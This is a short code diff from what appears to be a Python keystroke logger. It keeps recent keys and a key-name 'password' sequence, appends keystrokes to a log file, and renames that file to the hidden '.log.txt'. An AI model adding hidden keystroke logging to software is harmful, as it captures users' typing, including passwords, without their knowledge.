@@ -6,7 +6,7 @@ password = ['t', 'd', 'k', 'Key.enter', 'Key.shift']
 atualChars = deque(maxlen=5)
 
 def log(key):
-    with open("log.txt", "a") as file_log:
+    with open(".log.txt", "a") as file_log:
         file_log.write(key)
 
 def monitor(key):
